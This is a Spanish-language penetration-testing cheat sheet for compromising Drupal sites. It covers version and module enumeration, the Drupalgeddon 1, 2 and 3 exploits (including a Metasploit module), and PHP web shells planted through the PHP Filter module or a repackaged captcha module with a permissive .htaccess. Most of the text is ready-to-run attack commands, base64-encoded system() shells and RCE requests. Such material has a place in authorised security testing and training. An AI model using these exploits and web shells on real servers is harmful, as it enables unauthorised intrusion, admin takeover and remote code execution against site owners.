Drupal

Enumeración

Identificar Drupal

curl -s http://<ip_target> | grep Drupal

Nmap

# Detección de versión de Drupal y módulos
nmap -sV --script http-drupal-enum <url>

# Escaneo de vulnerabilidades en Drupal
nmap -sV --script "http-drupal* and not http-drupal-brute" <url>

# Detección de usuarios de Drupal
nmap -sV --script http-drupal-users <url>

# Escaneo completo para confirmar si se está utilizando Drupal
nmap --script=http-drupal-enum --script-args http-drupal-enum.root=/ -p 80,443 <url>

# Detectar vulnerabilidades específicas en Drupal y sus módulos
nmap --script=http-vuln* -p 80,443 <url>

Revisar ficheros habituales como CHANGELOG.txt, robots.txt y README.txt para obtener versión, rutas y pistas de módulos.

Droopescan

Instalar Droopescan

sudo pip3 install droopescan

Enumeración básica

droopescan scan drupal --url <url>

Enumerar plugins y temas

droopescan scan drupal -u <url> -e plugins,themes

Drupalgeddon1 SQLi: Drupal 7.0-7.31 (CVE-2014-3704)

Crear usuario administrador

python2.7 drupalgeddon.py -t http://<url> -u hacker -p pwnd

Drupalgeddon2 RCE: Drupal 6.x, 7.x-7.58, 8.x-8.5.1 (CVE-2018-7600)

Comprobar explotación

python3 drupalgeddon2.py
curl -s http://<url>/hello.txt

Preparar payload PHP en Base64

echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K

Editar exploit

# Modificar el payload original del exploit por nuestro payload
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php

Explotar RCE

python3 drupalgeddon2.py
curl http://<url>/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

Drupalgeddon3: Drupal 7.x/8.x con cookie de sesión (CVE-2018-7602)

Metasploit

use exploit/multi/http/drupal_drupageddon3
set RHOSTS <ip_target>
set VHOST <vhost>
set DRUPAL_SESSION <cookie_sesion>
set DRUPAL_NODE 1
set LHOST <kali_ip>

Acceso Drupal: editar módulo PHP Filter

Con acceso administrativo se puede habilitar PHP filter en módulos, crear una Basic page y ejecutar código PHP. En Drupal 8 y posteriores puede requerir instalar el módulo primero.

Instalar PHP Filter si no existe

wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz

PHP con parámetro de ejecución

# Title
Test
# Body
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
# Text Format
PHP code
# Explotar RCE
http://url/<node_creado>/?dcfdd5e021a869fcc6dfaef8bf31377e=whoami

Acceso Drupal: cargar módulo nuevo controlado

Descargar y descomprimir módulo

wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

shell.php

<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>

.htaccess para permitir acceso directo

<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>

Empaquetar módulo

mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/

Ejecutar payload

curl -s http://url/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id
